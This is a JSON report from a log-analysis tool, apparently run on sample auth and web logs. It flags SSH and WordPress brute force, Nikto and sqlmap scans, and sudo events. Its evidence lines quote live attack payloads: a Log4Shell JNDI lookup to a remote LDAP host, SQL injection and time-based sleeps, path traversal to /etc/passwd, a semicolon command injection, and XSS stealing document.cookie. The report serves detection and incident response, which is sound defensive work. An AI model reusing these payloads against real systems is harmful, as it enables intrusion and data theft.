@@ -1,0 +1,290 @@
+{
+  "generator": "loganalyzer 0.1.0",
+  "generated_at": "2026-10-23T13:33:49",
+  "files": [
+    {
+      "path": "samples\\auth.log",
+      "format": "auth",
+      "lines": 180,
+      "events": 70,
+      "unrecognised_lines": 0
+    },
+    {
+      "path": "samples\\access.log",
+      "format": "web",
+      "lines": 467,
+      "events": 467,
+      "unrecognised_lines": 0
+    }
+  ],
+  "summary": {
+    "critical": 3,
+    "high": 5,
+    "medium": 7,
+    "low": 2,
+    "info": 0
+  },
+  "findings": [
+    {
+      "rule": "ssh_bruteforce_success",
+      "severity": "critical",
+      "title": "Successful login after brute force from 203.0.113.45",
+      "description": "203.0.113.45 logged in as admin after 41 failed attempts. Treat the account as compromised: check what that session did, rotate its credentials and block the IP.",
+      "ip": "203.0.113.45",
+      "count": 3,
+      "first_seen": "2026-10-21T03:18:03",
+      "last_seen": "2026-10-21T03:18:43",
+      "evidence": [
+        "auth.log:61  Oct 21 03:18:03 web01 sshd[55504]: message repeated 3 times: [ Failed password for admin from 203.0.113.45 port 58793 ssh2]",
+        "auth.log:62  Oct 21 03:18:43 web01 sshd[16692]: Accepted password for admin from 203.0.113.45 port 50076 ssh2"
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "critical",
+      "title": "Log4Shell (CVE-2021-44228) from 192.0.2.150",
+      "description": "2 request(s) carrying Log4Shell (CVE-2021-44228) payloads. 2 got a 2xx response, so check whether the attack worked.",
+      "ip": "192.0.2.150",
+      "count": 2,
+      "first_seen": "2026-10-21T06:03:51",
+      "last_seen": "2026-10-21T06:03:52",
+      "evidence": [
+        "access.log:14  192.0.2.150 - - [21/Oct/2026:06:03:51 +0000] \"GET / HTTP/1.1\" 200 24594 \"-\" \"${jndi:ldap://192.0.2.150:1389/Basic/Command/Base64/aWQ=}\"",
+        "access.log:15  192.0.2.150 - - [21/Oct/2026:06:03:52 +0000] \"GET /?x=${jndi:ldap://192.0.2.150:1389/a} HTTP/1.1\" 200 20807 \"-\" \"-\""
+      ]
+    },
+    {
+      "rule": "http_bruteforce",
+      "severity": "critical",
+      "title": "Web login brute force from 198.51.100.200",
+      "description": "35 login POSTs to /wp-login.php, up to 35 within 5 min. 1 ended in a redirect, which often means a successful login.",
+      "ip": "198.51.100.200",
+      "count": 35,
+      "first_seen": "2026-10-21T19:05:00",
+      "last_seen": "2026-10-21T19:07:38",
+      "evidence": [
+        "access.log:339  198.51.100.200 - - [21/Oct/2026:19:05:00 +0000] \"POST /wp-login.php HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\"",
+        "access.log:340  198.51.100.200 - - [21/Oct/2026:19:05:04 +0000] \"POST /wp-login.php HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\"",
+        "access.log:341  198.51.100.200 - - [21/Oct/2026:19:05:08 +0000] \"POST /wp-login.php HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\"",
+        "access.log:342  198.51.100.200 - - [21/Oct/2026:19:05:10 +0000] \"POST /wp-login.php HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\"",
+        "access.log:373  198.51.100.200 - - [21/Oct/2026:19:07:38 +0000] \"POST /wp-login.php HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\""
+      ]
+    },
+    {
+      "rule": "ssh_bruteforce",
+      "severity": "high",
+      "title": "SSH brute force from 203.0.113.45",
+      "description": "41 failed SSH logins, peaking at 41 within 10 min. Accounts targeted: admin, root, ubuntu.",
+      "ip": "203.0.113.45",
+      "count": 41,
+      "first_seen": "2026-10-21T03:12:04",
+      "last_seen": "2026-10-21T03:18:03",
+      "evidence": [
+        "auth.log:16  Oct 21 03:12:04 web01 sshd[46099]: Failed password for root from 203.0.113.45 port 50971 ssh2",
+        "auth.log:17  Oct 21 03:12:16 web01 sshd[45866]: Failed password for root from 203.0.113.45 port 37196 ssh2",
+        "auth.log:18  Oct 21 03:12:25 web01 sshd[51352]: Failed password for root from 203.0.113.45 port 57618 ssh2",
+        "auth.log:19  Oct 21 03:12:29 web01 sshd[54857]: Failed password for root from 203.0.113.45 port 37505 ssh2",
+        "auth.log:61  Oct 21 03:18:03 web01 sshd[55504]: message repeated 3 times: [ Failed password for admin from 203.0.113.45 port 58793 ssh2]"
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "high",
+      "title": "Sensitive file probing from 192.0.2.77",
+      "description": "12 request(s) carrying Sensitive file probing payloads. 1 got a 2xx response, so check whether the attack worked. Exposed: /.env.",
+      "ip": "192.0.2.77",
+      "count": 12,
+      "first_seen": "2026-10-21T11:47:20",
+      "last_seen": "2026-10-21T11:48:47",
+      "evidence": [
+        "access.log:118  192.0.2.77 - - [21/Oct/2026:11:47:20 +0000] \"GET /server-status HTTP/1.1\" 404 598 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:119  192.0.2.77 - - [21/Oct/2026:11:47:21 +0000] \"GET /.git/config HTTP/1.1\" 404 166 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:120  192.0.2.77 - - [21/Oct/2026:11:47:25 +0000] \"GET /.svn/entries HTTP/1.1\" 404 464 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:121  192.0.2.77 - - [21/Oct/2026:11:47:26 +0000] \"GET /.htpasswd HTTP/1.1\" 404 273 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:152  192.0.2.77 - - [21/Oct/2026:11:48:47 +0000] \"GET /.env HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\""
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "high",
+      "title": "SQL injection from 203.0.113.99",
+      "description": "7 request(s) carrying SQL injection payloads. 6 got a 2xx response, so check whether the attack worked.",
+      "ip": "203.0.113.99",
+      "count": 7,
+      "first_seen": "2026-10-21T15:20:12",
+      "last_seen": "2026-10-21T15:20:32",
+      "evidence": [
+        "access.log:239  203.0.113.99 - - [21/Oct/2026:15:20:12 +0000] \"GET /products.php?id=3%27%20AND%20%271%27%3D%271 HTTP/1.1\" 500 280 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:240  203.0.113.99 - - [21/Oct/2026:15:20:14 +0000] \"GET /products.php?id=3%27%20OR%20%271%27%3D%271%27%20--%20- HTTP/1.1\" 200 21944 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:241  203.0.113.99 - - [21/Oct/2026:15:20:20 +0000] \"GET /products.php?id=3%20AND%20SLEEP%285%29 HTTP/1.1\" 200 5481 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:242  203.0.113.99 - - [21/Oct/2026:15:20:24 +0000] \"GET /products.php?id=3%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\" 200 24618 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:245  203.0.113.99 - - [21/Oct/2026:15:20:32 +0000] \"GET /products.php?id=3%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29 HTTP/1.1\" 200 17893 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\""
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "high",
+      "title": "Path traversal / file inclusion from 203.0.113.99",
+      "description": "4 request(s) carrying Path traversal / file inclusion payloads. 2 got a 2xx response, so check whether the attack worked.",
+      "ip": "203.0.113.99",
+      "count": 4,
+      "first_seen": "2026-10-21T15:34:00",
+      "last_seen": "2026-10-21T15:35:40",
+      "evidence": [
+        "access.log:253  203.0.113.99 - - [21/Oct/2026:15:34:00 +0000] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 200 39947 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\"",
+        "access.log:254  203.0.113.99 - - [21/Oct/2026:15:34:24 +0000] \"GET /download.php?file=../../../etc/shadow HTTP/1.1\" 403 170 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\"",
+        "access.log:255  203.0.113.99 - - [21/Oct/2026:15:34:31 +0000] \"GET /download.php?file=..%5c..%5cwindows%5cwin.ini HTTP/1.1\" 404 246 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\"",
+        "access.log:259  203.0.113.99 - - [21/Oct/2026:15:35:40 +0000] \"GET /ping.php?host=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 200 31717 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\""
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "high",
+      "title": "OS command injection from 203.0.113.99",
+      "description": "1 request(s) carrying OS command injection payloads. 1 got a 2xx response, so check whether the attack worked.",
+      "ip": "203.0.113.99",
+      "count": 1,
+      "first_seen": "2026-10-21T15:35:40",
+      "last_seen": "2026-10-21T15:35:40",
+      "evidence": [
+        "access.log:259  203.0.113.99 - - [21/Oct/2026:15:35:40 +0000] \"GET /ping.php?host=127.0.0.1%3B%20cat%20/etc/passwd HTTP/1.1\" 200 31717 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\""
+      ]
+    },
+    {
+      "rule": "user_enumeration",
+      "severity": "medium",
+      "title": "Username enumeration / password spraying from 198.51.100.23",
+      "description": "8 different usernames tried (8 do not exist on the host): deploy, ftpuser, git, jenkins, minecraft, oracle, postgres, test.",
+      "ip": "198.51.100.23",
+      "count": 8,
+      "first_seen": "2026-10-21T01:36:05",
+      "last_seen": "2026-10-21T15:28:57",
+      "evidence": [
+        "auth.log:8  Oct 21 01:36:05 web01 sshd[48966]: Invalid user test from 198.51.100.23 port 32806",
+        "auth.log:68  Oct 21 03:52:04 web01 sshd[35911]: Invalid user oracle from 198.51.100.23 port 54923",
+        "auth.log:75  Oct 21 05:08:08 web01 sshd[32148]: Invalid user postgres from 198.51.100.23 port 51618",
+        "auth.log:87  Oct 21 07:35:10 web01 sshd[35581]: Invalid user git from 198.51.100.23 port 38685",
+        "auth.log:143  Oct 21 15:28:57 web01 sshd[30588]: Invalid user minecraft from 198.51.100.23 port 46959"
+      ]
+    },
+    {
+      "rule": "sudo_root_shell",
+      "severity": "medium",
+      "title": "Interactive root shell via sudo by admin",
+      "description": "admin opened a root shell 1 time(s) (/bin/bash). Commands typed in that shell are not logged by sudo.",
+      "ip": null,
+      "count": 1,
+      "first_seen": "2026-10-21T03:20:43",
+      "last_seen": "2026-10-21T03:20:43",
+      "evidence": [
+        "auth.log:64  Oct 21 03:20:43 web01 sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash"
+      ]
+    },
+    {
+      "rule": "web_scan",
+      "severity": "medium",
+      "title": "Directory / vulnerability scan from 192.0.2.77",
+      "description": "40 distinct paths returned 404, up to 40 within 10 min: looks like automated content discovery.",
+      "ip": "192.0.2.77",
+      "count": 40,
+      "first_seen": "2026-10-21T11:47:02",
+      "last_seen": "2026-10-21T11:48:45",
+      "evidence": [
+        "access.log:112  192.0.2.77 - - [21/Oct/2026:11:47:02 +0000] \"GET /admin/ HTTP/1.1\" 404 518 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:113  192.0.2.77 - - [21/Oct/2026:11:47:06 +0000] \"GET /backup/ HTTP/1.1\" 404 422 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:114  192.0.2.77 - - [21/Oct/2026:11:47:10 +0000] \"GET /old/ HTTP/1.1\" 404 571 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:115  192.0.2.77 - - [21/Oct/2026:11:47:12 +0000] \"GET /test.php HTTP/1.1\" 404 276 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:151  192.0.2.77 - - [21/Oct/2026:11:48:45 +0000] \"GET /logs/ HTTP/1.1\" 404 363 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\""
+      ]
+    },
+    {
+      "rule": "suspicious_user_agent",
+      "severity": "medium",
+      "title": "Nikto traffic from 192.0.2.77",
+      "description": "41 request(s) sent with Nikto (a known security scanner).",
+      "ip": "192.0.2.77",
+      "count": 41,
+      "first_seen": "2026-10-21T11:47:02",
+      "last_seen": "2026-10-21T11:48:47",
+      "evidence": [
+        "access.log:112  192.0.2.77 - - [21/Oct/2026:11:47:02 +0000] \"GET /admin/ HTTP/1.1\" 404 518 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:113  192.0.2.77 - - [21/Oct/2026:11:47:06 +0000] \"GET /backup/ HTTP/1.1\" 404 422 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:114  192.0.2.77 - - [21/Oct/2026:11:47:10 +0000] \"GET /old/ HTTP/1.1\" 404 571 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:115  192.0.2.77 - - [21/Oct/2026:11:47:12 +0000] \"GET /test.php HTTP/1.1\" 404 276 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\"",
+        "access.log:152  192.0.2.77 - - [21/Oct/2026:11:48:47 +0000] \"GET /.env HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)\""
+      ]
+    },
+    {
+      "rule": "sudo_failures",
+      "severity": "medium",
+      "title": "Repeated sudo failures by bob",
+      "description": "3 failed sudo attempts (wrong password or user not in sudoers).",
+      "ip": null,
+      "count": 3,
+      "first_seen": "2026-10-21T14:02:31",
+      "last_seen": "2026-10-21T14:03:52",
+      "evidence": [
+        "auth.log:134  Oct 21 14:02:31 web01 sudo:   bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts",
+        "auth.log:135  Oct 21 14:03:40 web01 sudo:   bob : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts",
+        "auth.log:136  Oct 21 14:03:52 web01 sudo:   bob : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts"
+      ]
+    },
+    {
+      "rule": "suspicious_user_agent",
+      "severity": "medium",
+      "title": "sqlmap traffic from 203.0.113.99",
+      "description": "8 request(s) sent with sqlmap (a known security scanner).",
+      "ip": "203.0.113.99",
+      "count": 8,
+      "first_seen": "2026-10-21T15:20:10",
+      "last_seen": "2026-10-21T15:20:32",
+      "evidence": [
+        "access.log:238  203.0.113.99 - - [21/Oct/2026:15:20:10 +0000] \"GET /products.php?id=3%27 HTTP/1.1\" 500 348 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:239  203.0.113.99 - - [21/Oct/2026:15:20:12 +0000] \"GET /products.php?id=3%27%20AND%20%271%27%3D%271 HTTP/1.1\" 500 280 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:240  203.0.113.99 - - [21/Oct/2026:15:20:14 +0000] \"GET /products.php?id=3%27%20OR%20%271%27%3D%271%27%20--%20- HTTP/1.1\" 200 21944 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:241  203.0.113.99 - - [21/Oct/2026:15:20:20 +0000] \"GET /products.php?id=3%20AND%20SLEEP%285%29 HTTP/1.1\" 200 5481 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\"",
+        "access.log:245  203.0.113.99 - - [21/Oct/2026:15:20:32 +0000] \"GET /products.php?id=3%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29 HTTP/1.1\" 200 17893 \"-\" \"sqlmap/1.8.9#stable (https://sqlmap.org)\""
+      ]
+    },
+    {
+      "rule": "web_attack",
+      "severity": "medium",
+      "title": "Cross-site scripting (XSS) from 203.0.113.99",
+      "description": "2 request(s) carrying Cross-site scripting (XSS) payloads. 2 got a 2xx response, so check whether the attack worked.",
+      "ip": "203.0.113.99",
+      "count": 2,
+      "first_seen": "2026-10-21T15:35:01",
+      "last_seen": "2026-10-21T15:35:29",
+      "evidence": [
+        "access.log:256  203.0.113.99 - - [21/Oct/2026:15:35:01 +0000] \"GET /search?q=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E HTTP/1.1\" 200 38807 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\"",
+        "access.log:258  203.0.113.99 - - [21/Oct/2026:15:35:29 +0000] \"GET /search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1\" 200 36924 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\""
+      ]
+    },
+    {
+      "rule": "off_hours_login",
+      "severity": "low",
+      "title": "Off-hours login: admin from 203.0.113.45",
+      "description": "1 successful login(s) outside working hours (08:00-20:00) at 03:18.",
+      "ip": "203.0.113.45",
+      "count": 1,
+      "first_seen": "2026-10-21T03:18:43",
+      "last_seen": "2026-10-21T03:18:43",
+      "evidence": [
+        "auth.log:62  Oct 21 03:18:43 web01 sshd[16692]: Accepted password for admin from 203.0.113.45 port 50076 ssh2"
+      ]
+    },
+    {
+      "rule": "off_hours_login",
+      "severity": "low",
+      "title": "Off-hours login: alice from 10.0.0.12",
+      "description": "1 successful login(s) outside working hours (08:00-20:00) at 23:41.",
+      "ip": "10.0.0.12",
+      "count": 1,
+      "first_seen": "2026-10-21T23:41:03",
+      "last_seen": "2026-10-21T23:41:03",
+      "evidence": [
+        "auth.log:178  Oct 21 23:41:03 web01 sshd[18691]: Accepted publickey for alice from 10.0.0.12 port 52433 ssh2"
+      ]
+    }
+  ]
+}
